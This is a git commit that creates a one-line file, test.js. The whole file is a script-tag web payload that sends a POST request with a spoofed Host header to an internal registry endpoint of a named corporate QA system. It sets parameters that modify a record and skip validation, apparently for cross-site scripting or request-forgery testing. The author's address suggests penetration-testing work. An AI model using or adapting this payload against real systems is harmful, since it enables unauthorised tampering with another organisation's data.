4c5a21ae0a41d1c0555d035a154bdad4db47b026
angri27 <pablo.pino@tarlogic.com>
2025-02-11 15:57:24 +0100

    Create test.js

---
+++ test.js
@@ -0,0 +1,1 @@
+<script>with(new XMLHttpRequest()){open('POST', '/aforojga/registrosAction.do', true);setRequestHeader('Host', 'foroelectronico.qa.corp.iberdrola.com');setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');send('metodoAction=modificar&metodoValidacion=sinValidacion&registroDto.idRegistro=133&registroDto.estado.idRegistro=1');}</script>
